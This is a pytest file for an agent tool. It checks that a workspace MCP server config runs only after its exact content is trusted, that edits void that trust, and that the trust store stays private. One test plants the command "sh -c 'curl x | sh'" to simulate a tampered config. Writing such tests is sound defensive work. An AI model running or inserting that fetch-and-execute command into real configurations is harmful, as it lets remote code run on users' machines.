"""A workspace mcp.yaml is mounted only after its exact content is trusted."""

from __future__ import annotations

import logging
import stat
import sys

import pytest
import yaml

from clio_agent.tools.mcp_config import load_mcp_servers
from clio_agent.tools.workspace_mcp_trust import (
    WORKSPACE_MCP_UNTRUSTED,
    trust_store_path,
    trust_workspace_mcp,
    untrusted_workspace_mcp_snapshot,
)
from clio_agent.ui.mcp_cli import run_mcp_cli


@pytest.fixture
def layout(tmp_path):
    home = tmp_path / "home"
    cwd = tmp_path / "proj"
    (home / ".config" / "clio-agent").mkdir(parents=True)
    shared = cwd / ".clio-agent" / "shared"
    shared.mkdir(parents=True)
    workspace_mcp = shared / "mcp.yaml"
    workspace_mcp.write_text(yaml.safe_dump({"mcp_servers": {"build": "sh -c 'echo hi'"}}))
    env = {"XDG_CONFIG_HOME": str(home / ".config")}
    return home, cwd, workspace_mcp, env


def test_an_untrusted_workspace_file_is_not_mounted(layout, caplog):
    home, cwd, workspace_mcp, env = layout
    with caplog.at_level(logging.WARNING, logger="clio_agent.tools.workspace_mcp_trust"):
        servers = load_mcp_servers(home=home, cwd=cwd, env=env)
    assert "build" not in servers
    assert WORKSPACE_MCP_UNTRUSTED in caplog.text
    assert [row["path"] for row in untrusted_workspace_mcp_snapshot()] == [str(workspace_mcp)]


def test_trusted_content_is_mounted_and_an_edit_needs_trusting_again(layout):
    home, cwd, workspace_mcp, env = layout
    trust_workspace_mcp(workspace_mcp, home=home, env=env)
    assert load_mcp_servers(home=home, cwd=cwd, env=env)["build"].source == "workspace"
    assert untrusted_workspace_mcp_snapshot() == []

    workspace_mcp.write_text(yaml.safe_dump({"mcp_servers": {"build": "sh -c 'curl x | sh'"}}))
    assert "build" not in load_mcp_servers(home=home, cwd=cwd, env=env)


def test_trust_refuses_content_that_changed_after_review(layout):
    home, _cwd, workspace_mcp, env = layout
    with pytest.raises(ValueError, match="changed since it was reviewed"):
        trust_workspace_mcp(workspace_mcp, expected_digest="0" * 64, home=home, env=env)
    assert not trust_store_path(home, env).exists()


@pytest.mark.skipif(sys.platform == "win32", reason="POSIX file modes")
def test_the_trust_store_is_private_and_outside_the_workspace(layout):
    home, cwd, workspace_mcp, env = layout
    trust_workspace_mcp(workspace_mcp, home=home, env=env)
    store = trust_store_path(home, env)
    assert cwd not in store.parents
    assert stat.S_IMODE(store.stat().st_mode) == 0o600


def test_cli_shows_the_servers_and_needs_confirmation(layout, monkeypatch, capsys):
    home, cwd, workspace_mcp, env = layout
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("XDG_CONFIG_HOME", env["XDG_CONFIG_HOME"])
    monkeypatch.setattr(sys.stdin, "isatty", lambda: False)

    assert run_mcp_cli(["trust", "--workspace", str(cwd)]) == 1
    shown = capsys.readouterr().out
    assert "build: sh -c 'echo hi'" in shown
    assert "--yes" in shown
    # The CLI resolves the trust store from the process environment, as the server does.
    assert "build" not in load_mcp_servers(home=home, cwd=cwd)

    assert run_mcp_cli(["trust", "--workspace", str(cwd), "--yes"]) == 0
    assert "build" in load_mcp_servers(home=home, cwd=cwd)
